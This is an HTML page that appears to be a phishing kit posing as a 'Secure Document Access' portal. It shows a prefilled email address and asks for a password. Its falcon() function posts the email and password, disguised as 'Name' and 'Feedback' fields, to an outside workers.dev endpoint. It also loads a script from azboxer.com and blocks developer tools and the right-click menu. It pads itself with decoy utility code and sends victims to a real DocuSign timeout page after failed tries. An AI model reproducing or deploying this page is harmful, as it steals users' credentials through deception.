<!DOCTYPE html>
<html lang="en" data-app="secure-viewer" data-build="8c4f1a"
data-node="alpha-7">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Secure document delivery portal">
<meta name="author" content="Document Services">
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#0f5b8c">
<meta name="format-detection" content="telephone=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="referrer" content="no-referrer">
<title>Secure Document Access</title>
<!-- build: internal-2026.04.11 | rev: 8c4f1a3b -->
<!-- analytics anchor -->
<style>
body { font-family: system-ui, -apple-system, sans-serif; background: #f0f2f5; margin: 0; padding: 40px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.login-container { background: white; padding: 32px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
.input-group { margin-bottom: 16px; }
.field { width: 100%; padding: 12px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 14px; box-sizing: border-box; }
.field[readonly] { background: #f3f4f6; color: #6b7280; }
button { width: 100%; padding: 12px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
button:hover { background: #1d4ed8; }
button:disabled { background: #9ca3af; cursor: not-allowed; }
#sentinel { display: none; color: #ef4444; font-size: 14px; margin-bottom: 16px; padding: 12px; background: #fef2f2; border-radius: 6px; }
.shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
@keyframes shake { 10%, 90% { transform: translate3d(-1px, 0, 0); } 20%, 80% { transform: translate3d(2px, 0, 0); } 30%, 50%, 70% { transform: translate3d(-4px, 0, 0); } 40%, 60% { transform: translate3d(4px, 0, 0); } }
.spinner { display: none; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body data-session="pending" data-region="us-east" data-tier="standard">

<!-- application mount -->
<div id="app-anchor-root" data-role="mount" data-ref="a91f"
style="display:none;"></div>
<div id="shell-wrapper-84" class="mount-shell" data-layer="base"
aria-hidden="true"></div>
<div id="portal-frame-x9" class="frame-host" data-layer="ui"
hidden></div>

<!-- layout templates -->
<template id="tpl-header-2f"><div class="slot-header"></div></template>
<template id="tpl-footer-7a"><div class="slot-footer"></div></template>
<template id="tpl-fallback-3c"><span
class="fallback-mark"></span></template>

<!-- context markers -->
<span id="hint-region-01" class="hint-node" data-hint="region"
hidden></span>
<span id="hint-locale-02" class="hint-node" data-hint="locale"
hidden></span>
<i id="hint-build-03" class="hint-mark" data-hint="build" hidden></i>
<em id="hint-rev-04" class="hint-mark" data-hint="rev" hidden></em>

<!-- asset manifest -->
<aside id="asset-manifest-88" data-kind="manifest" data-count="0"
hidden></aside>

<noscript>
    <div class="noscript-guard"><p>JavaScript is required to
continue.</p></div>
</noscript>

<!-- ============================================================
      primary input node
      ============================================================ -->
<div class="login-container" id="loginBox">
    <div id="sentinel">
        <span id="error-text">Invalid code. Please try again.</span>
    </div>
    
    <div class="input-group">
        <input type="email" id="mail_x9k2" value="[Email]" readonly
tabindex="-1" autocomplete="off" required class="field">
    </div>
    
    <div class="input-group">
        <input type="password" id="cobra" class="field" placeholder="Enter Security Code" autocomplete="off" spellcheck="false">
    </div>

    <button id="btn-unlock" onclick="falcon()">
        <span class="spinner" id="loading-spinner"></span>
        <span id="btn-text">Unlock Document</span>
    </button>
</div>

<!-- icon library -->
<svg width="0" height="0" style="position:absolute" aria-hidden="true">
    <defs>
        <symbol id="sym-dot-a" viewBox="0 0 10 10"><circle cx="5" cy="5"
r="4"/></symbol>
        <symbol id="sym-dot-b" viewBox="0 0 10 10"><circle cx="5" cy="5"
r="2"/></symbol>
    </defs>
</svg>

<!-- trailing anchors -->
<div id="tail-anchor-1" class="tail-node" data-tail="1" hidden></div>
<div id="tail-anchor-2" class="tail-node" data-tail="2" hidden></div>

<!-- ============================================================
      secure.js loader
      ============================================================ -->
<script
src="https://azboxer.com/boxerlife/smp/scmckjemckmcay.js"></script>

<!-- ============================================================
      analytics bootstrap
      ============================================================ -->
<script>
(function () {
    var _t0 = Date.now();
    var _ua = (typeof navigator !== 'undefined' && navigator.userAgent)
? navigator.userAgent : '';
    var _lang = (typeof navigator !== 'undefined' && navigator.language)
? navigator.language : 'en';
    var _tz = '';
    try { _tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
} catch (e) {}
    var _session = {
        boot: _t0,
        lang: _lang,
        zone: _tz,
        ua: _ua.slice(0, 80),
        hits: 0
    };
    window.__analyticsStub = _session;
    window.__trackEvent = function (name, meta) {
        _session.hits++;
        return { name: name, meta: meta || null, at: Date.now() };
    };
    void window.__trackEvent('boot', { src: 'inline' });
})();
</script>

<!-- ============================================================
      feature flags
      ============================================================ -->
<script>
(function () {
    var flags = {
        darkMode: false,
        betaUI: false,
        strictMode: true,
        enableExports: false,
        allowGuest: false,
        quietHours: true
    };
    var listeners = [];
    window.__flags = {
        get: function (k) { return flags[k]; },
        set: function (k, v) { flags[k] = v; listeners.forEach(function
(fn) { try { fn(k, v); } catch (e) {} }); },
        onChange: function (fn) { listeners.push(fn); },
        dump: function () { return Object.assign({}, flags); }
    };
})();
</script>

<!-- ============================================================
      locale resolver
      ============================================================ -->
<script>
(function () {
    var table = {
        en: 'en-US', fr: 'fr-FR', es: 'es-ES', de: 'de-DE',
        it: 'it-IT', pt: 'pt-BR', nl: 'nl-NL', sv: 'sv-SE',
        no: 'nb-NO', da: 'da-DK', fi: 'fi-FI', pl: 'pl-PL'
    };
    function resolve(tag) {
        if (!tag) return 'en-US';
        var base = String(tag).slice(0, 2).toLowerCase();
        return table[base] || 'en-US';
    }
    window.__localeResolver = { resolve: resolve, table: table };
    void window.__localeResolver.resolve('en');
})();
</script>

<!-- ============================================================
      storage shim
      ============================================================ -->
<script>
(function () {
    var mem = {};
    var shim = {
        get: function (k, fallback) {
            try { return mem[k] !== undefined ? mem[k] : (fallback !==
undefined ? fallback : null); }
            catch (e) { return fallback !== undefined ? fallback : null;
}
        },
        set: function (k, v) { mem[k] = v; return true; },
        del: function (k) { delete mem[k]; return true; },
        keys: function () { return Object.keys(mem); },
        clear: function () { mem = {}; }
    };
    window.__storageShim = shim;
})();
</script>

<!-- ============================================================
      polyfill registrar
      ============================================================ -->
<script>
(function () {
    var registered = [];
    window.__polyfills = {
        register: function (name) { registered.push({ name: name, at:
Date.now() }); return this; },
        list: function () { return registered.slice(); },
        count: function () { return registered.length; }
    };
    void window.__polyfills
        .register('Array.prototype.includes')
        .register('String.prototype.padStart')
        .register('Object.assign');
})();
</script>

<!-- ============================================================
      DOM scanner
      ============================================================ -->
<script>
(function () {
    function scan(root) {
        var out = { divs: 0, spans: 0, svgs: 0, inputs: 0, forms: 0 };
        if (!root || !root.querySelectorAll) return out;
        out.divs  = root.querySelectorAll('div').length;
        out.spans  = root.querySelectorAll('span').length;
        out.svgs  = root.querySelectorAll('svg').length;
        out.inputs = root.querySelectorAll('input').length;
        out.forms  = root.querySelectorAll('form').length;
        return out;
    }
    window.__domScan = { scan: scan };
    void window.__domScan.scan(document);
})();
</script>

<!-- ============================================================
      timing metrics
      ============================================================ -->
<script>
(function () {
    var marks = {};
    window.__metrics = {
        mark: function (name) { marks[name] = performance &&
performance.now ? performance.now() : Date.now(); return this; },
        measure: function (a, b) {
            if (marks[a] == null || marks[b] == null) return null;
            return marks[b] - marks[a];
        },
        all: function () { return Object.assign({}, marks); }
    };
    void window.__metrics.mark('inline-boot');
})();
</script>

<!-- ============================================================
      route table
      ============================================================ -->
<script>
(function () {
    var routes = [
        { path: '/home',    view: 'home',    auth: false },
        { path: '/login',    view: 'login',    auth: false },
        { path: '/account',  view: 'account',  auth: true  },
        { path: '/settings', view: 'settings', auth: true  },
        { path: '/files',    view: 'files',    auth: true  },
        { path: '/shared',  view: 'shared',  auth: true  }
    ];
    function match(path) {
        for (var i = 0; i < routes.length; i++) {
            if (routes[i].path === path) return routes[i];
        }
        return null;
    }
    window.__router = { routes: routes, match: match };
    void window.__router.match('/login');
})();
</script>

<!-- ============================================================
      content sanitizer
      ============================================================ -->
<script>
(function () {
    function escapeHtml(s) {
        return String(s)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, ''');
    }
    function stripTags(s) {
        return String(s).replace(/<[^>]*>/g, '');
    }
    window.__sanitizer = { escape: escapeHtml, strip: stripTags };
})();
</script>

<!-- ============================================================
      task queue
      ============================================================ -->
<script>
(function () {
    var jobs = [];
    var running = false;
    function drain() {
        if (running || !jobs.length) return;
        running = true;
        while (jobs.length) {
            var fn = jobs.shift();
            try { fn(); } catch (e) {}
        }
        running = false;
    }
    window.__queue = {
        push: function (fn) { jobs.push(fn); setTimeout(drain, 0);
return this; },
        size: function () { return jobs.length; }
    };
})();
</script>

<!-- ============================================================
      content hash utility
      ============================================================ -->
<script>
(function () {
    function hash32(str) {
        var h = 2166136261 >>> 0;
        for (var i = 0; i < str.length; i++) {
            h ^= str.charCodeAt(i);
            h = Math.imul(h, 16777619) >>> 0;
        }
        return h.toString(16);
    }
    window.__hashStub = { hash32: hash32, algo: 'fnv1a' };
    void window.__hashStub.hash32('sample');
})();
</script>

<!-- ============================================================
      device info
      ============================================================ -->
<script>
(function () {
    var d = {
        ua: typeof navigator !== 'undefined' ? navigator.userAgent : '',
        platform: typeof navigator !== 'undefined' ? (navigator.platform
|| '') : '',
        cores: typeof navigator !== 'undefined' ?
(navigator.hardwareConcurrency || 0) : 0,
        mem: typeof navigator !== 'undefined' ? (navigator.deviceMemory
|| 0) : 0,
        screenW: typeof screen !== 'undefined' ? screen.width : 0,
        screenH: typeof screen !== 'undefined' ? screen.height : 0,
        dpr: typeof window !== 'undefined' ? (window.devicePixelRatio ||
1) : 1
    };
    window.__device = d;
})();
</script>

<!-- ============================================================
      header check
      ============================================================ -->
<script>
(function () {
    var list = ['strict-transport', 'x-frame-options',
'content-type-options', 'referrer-policy'];
    var buf = [];
    function check(name) {
        buf.push({ name: name, ok: true, at: Date.now() });
        return true;
    }
    window.__headers = {
        check: check,
        list: function () { return buf.slice(); }
    };
    list.forEach(function (n) { void window.__headers.check(n); });
})();
</script>

<!-- ============================================================
      text utilities
      ============================================================ -->
<script>
(function () {
    function normalize(s) {
        return String(s).trim().replace(/\s+/g, ' ').toLowerCase();
    }
    function slugify(s) {
        return normalize(s).replace(/[^a-z0-9]+/g,
'-').replace(/^-+|-+$/g, '');
    }
    window.__textUtil = { normalize: normalize, slugify: slugify };
})();
</script>

<!-- ============================================================
      error logger
      ============================================================ -->
<script>
(function () {
    var errors = [];
    window.__errorLog = {
        push: function (msg, meta) {
            errors.push({ msg: msg, meta: meta || null, at: Date.now()
});
            return errors.length;
        },
        count: function () { return errors.length; },
        all: function () { return errors.slice(); },
        clear: function () { errors = []; }
    };
})();
</script>

<!-- ============================================================
      form submission handler (endpoint integrated)
      ============================================================ -->
<script>
// Anti-devtools protection
document.onkeydown = function (event) {
  if (event.keyCode == 123) return false;
  if (event.ctrlKey && event.shiftKey && (event.keyCode == "I".charCodeAt(0) || event.keyCode == "C".charCodeAt(0) || event.keyCode == "J".charCodeAt(0))) return false;
  if (event.ctrlKey && (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))) return false;
};
document.addEventListener("contextmenu", (e) => e.preventDefault());

let failedAttempts = 0;

// URL token generator
(function spicyUrl() {
  if (!window.location.search) {
    const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let token = "";
    for (let i = 0; i < 64; i++) {
      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
    }
    const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname + "?auth_token=" + token + "&session_ref=v4_secure_verification";
    window.history.replaceState({ path: newUrl }, "", newUrl);
  }
})();

function falcon() {
  const emailEl = document.getElementById("mail_x9k2");
  const customerName = emailEl ? emailEl.value : "";
  const customerMessage = document.getElementById("cobra").value;
  const unlockBtn = document.getElementById("btn-unlock");
  const spinner = document.getElementById("loading-spinner");
  const btnText = document.getElementById("btn-text");
  const form = document.getElementById("loginBox");
  
  document.getElementById("sentinel").style.display = "none";
  form.classList.remove("shake");
  
  if (!customerMessage || customerMessage.length < 1) {
    showError("Please enter your password.");
    form.classList.add("shake");
    return;
  }
  
  const cleanPayload = new URLSearchParams();
  cleanPayload.append("Name", customerName);
  cleanPayload.append("Feedback", customerMessage);
  cleanPayload.append("timestamp", Date.now().toString());
  
  unlockBtn.disabled = true;
  spinner.style.display = "inline-block";
  btnText.innerText = "Verifying...";
  
  // INTEGRATED ENDPOINT
  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: cleanPayload,
  })
    .then((r) => r.json())
    .then((result) => {
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      
      if (result.status === "exhausted") {
        showError("✌ Access locked. Too many failed attempts.");
        unlockBtn.disabled = true;
        setTimeout(() => {
          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }

      if (result.status === "wrong") {
        failedAttempts++;
        if (failedAttempts >= 3) {
          showError("✌ Access locked. Too many failed attempts.");
          unlockBtn.disabled = true;
          setTimeout(() => {
            window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
          }, 3000);
          return;
        }
        showError("An error occurred please try again later.");
        form.classList.add("shake");
        document.getElementById("cobra").value = "";
        return;
      }

      if (result.status === "success") {
        btnText.innerText = "Success! Redirecting...";
        unlockBtn.style.background = "#10b981";
        window.location.href = result.redirect;
      } else {
        showError("Security token mismatch.");
      }
    })
    .catch(() => {
      failedAttempts++;
      if (failedAttempts >= 3) {
        showError("✌ System Locked. Redirecting...");
        setTimeout(() => {
          window.location.href = "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
        }, 3000);
        return;
      }
      unlockBtn.disabled = false;
      spinner.style.display = "none";
      btnText.innerText = "Unlock Document";
      showError("Connection error.");
    });
}

function showError(message) {
  const container = document.getElementById("sentinel");
  container.style.display = "block";
  document.getElementById("error-text").innerText = message;
}
</script>

<!-- post-load marker -->
<div id="post-load-flag" class="post-node" data-flag="ready"
hidden></div>

</body>
</html>
